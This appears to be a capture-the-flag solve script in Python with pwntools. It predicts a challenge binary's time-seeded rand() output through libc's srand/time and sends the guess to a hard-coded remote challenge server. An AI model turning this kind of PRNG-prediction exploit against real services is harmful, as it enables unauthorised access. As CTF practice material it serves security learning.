from ctypes import CDLL
import time
import math
from pwn import *

libc=CDLL("/lib/x86_64-linux-gnu/libc.so.6")

def getLittleRando():
    #now = int(math.floor(libc.time(0)))

    libc.srand(libc.time(0))

    return libc.rand()%0x100000

if __name__=="__main__":
    #io = process('./haySTACK')
    io = remote('18.118.188.100',5002)
    three_rands = []
    for i in range(3):
        three_rands.append(getLittleRando())
    io.sendlineafter(b'Which haystack do you want to check?',f'{three_rands[i]}')

    io.interactive()